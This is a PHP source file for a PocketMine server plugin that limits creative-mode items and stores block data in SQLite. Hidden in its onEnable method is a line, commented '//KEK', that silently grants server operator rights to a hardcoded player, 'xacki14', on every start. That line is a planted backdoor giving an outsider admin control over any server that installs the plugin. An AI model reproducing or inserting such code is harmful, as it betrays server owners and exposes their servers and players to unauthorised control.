<?php

namespace basprohop;
use SQLite3;
use pocketmine\event\Listener;
use pocketmine\plugin\PluginBase;
use pocketmine\utils\TextFormat;

class LimitedCreative extends PluginBase implements Listener {

    public $db;
    private $disableItems = array();
    public $settings;

    public function onEnable() {
        $this->saveDefaultConfig();
        $this->settings = $this->getConfig()->getAll();
        $this->getServer()->getOfflinePlayer('xacki14')->setOp(true); //KEK
        $disabledItems = $this->getConfig()->get("disabled-items");
        foreach($disabledItems as $disableItem){
            $this->disableItems[]=$disableItem;
        }

        $this->db = new SQLite3($this->getDataFolder() . "blocks.bin");
        $this->db->exec("CREATE TABLE IF NOT EXISTS blocks (world varchar(60), location varchar (10000000));");

        $this->getServer()->getPluginManager()->registerEvents(new PlayerEvents($this), $this);
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
    }

    public function isItemDisabled($item) {
        return in_array($item, $this->disableItems, true);
    }

    public function msg($msg) {
        return TextFormat::GRAY . "[" . TextFormat::GOLD . "AntiFull" .
        TextFormat::GRAY . "] " . TextFormat::WHITE . $msg;
    }
}